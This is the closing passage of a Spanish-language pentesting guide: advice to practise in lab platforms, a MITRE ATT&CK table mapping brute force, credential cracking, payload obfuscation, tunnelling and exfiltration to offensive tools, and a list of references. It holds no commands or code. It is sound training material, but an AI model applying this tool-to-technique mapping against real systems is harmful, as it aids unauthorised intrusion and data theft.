- **Adaptarte rápidamente** a diferentes escenarios

**🎯 Recomendación Final**: Practica estos comandos en entornos controlados (HTB, TryHackMe, VulnHub) hasta que se vuelvan segunda naturaleza. La velocidad y eficiencia en pentesting vienen de la repetición y el dominio de herramientas.

---

## MITRE ATT&CK Mapping

| Táctica | Técnica | Herramienta |
|---------|---------|-------------|
| Credential Access | T1110 - Brute Force | Hydra, Medusa, Patator |
| Credential Access | T1555 - Password Stores | John, Hashcat |
| Defense Evasion | T1027 - Obfuscated Files | msfvenom encoders, Veil |
| Command and Control | T1090 - Proxy | Chisel, SSH tunnels |
| Collection | T1005 - Data from Local System | grep, find |
| Exfiltration | T1041 - Exfiltration Over C2 | Python HTTP server |

---

## Referencias

- **OWASP**: https://owasp.org/
- **GTFOBins**: https://gtfobins.github.io/
- **HackTricks**: https://book.hacktricks.xyz/
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings
- **OSCP Guide**: https://www.offensive-security.com/pwk-oscp/

---

**Última actualización**: 2025-01-10
**Versión**: 1.0

*Este documento es parte de una serie de guías de pentesting. Consulta los otros documentos para información específica por área.*
